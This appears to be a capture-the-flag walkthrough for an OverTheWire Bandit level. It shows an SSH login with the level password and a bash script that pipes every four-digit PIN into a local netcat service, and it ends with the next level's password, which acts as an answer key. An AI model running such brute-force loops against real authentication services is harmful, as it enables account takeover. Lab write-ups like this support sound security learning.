# Level 25

## Objectives

1. SSH to `bandit24`
2. Brute force the pin-code daemon listening on `30002` using password as input

### Objective 1

* Username: `bandit24`
* Password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
* Port: `2220`  
* IP/Hostname: `bandit.labs.overthewire.org`

```sh
user@localhost:~$ ssh -p 2220 bandit24@bandit.labs.overthewire.org
```

> Success!

### Objective 2

Let's see what we get when we give it a random number.

```sh
bandit24@bandit:~$ echo "0000" | nc localhost 30002
```

So we need to force a disconnect after each `nc`.

Now we need to make a brute force script.

```sh
#!/bin/bash

PASSWD='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
LOG='/tmp/bruter.txt'

touch $LOG

for j in {0000..5000}
do
    str1="$PASSWD $j"
    echo $str1
done | nc localhost 30002 > $LOG

cat $LOG | grep -v Wrong

sleep 5

for i in {5000..9999}
do
    str2="$PASSWD $i"
    echo $str2
done | nc 127.0.0.1 30002 > $LOG

grep -v Wrong $LOG
```

Use an editor to make a script in `/tmp`.

```sh
bandit24@bandit:~$ nano /tmp/bruteforcepin.sh
Unable to create directory /home/bandit24/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit24@bandit:~$ bash /tmp/bruteforcepin.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```